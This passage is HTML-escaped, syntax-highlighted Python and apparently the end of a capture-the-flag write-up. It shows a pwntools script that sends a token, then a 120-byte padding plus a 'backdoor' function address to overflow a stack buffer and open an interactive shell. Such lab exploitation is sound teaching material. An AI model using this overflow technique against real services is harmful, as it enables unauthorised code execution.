ZtoZoiGXf4sDyUDuFG0Uf0DLCPGdYFAkCEYMvw4=&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;sendline&lt;/span&gt;(token)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;recvuntil&lt;/span&gt;(b&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter your username: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;120&lt;/span&gt; + &lt;span class=&#34;title function_ invoke__&#34;&gt;p64&lt;/span&gt;(backdoor)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;sendline&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;recv&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.&lt;span class=&#34;title function_ invoke__&#34;&gt;interactive&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
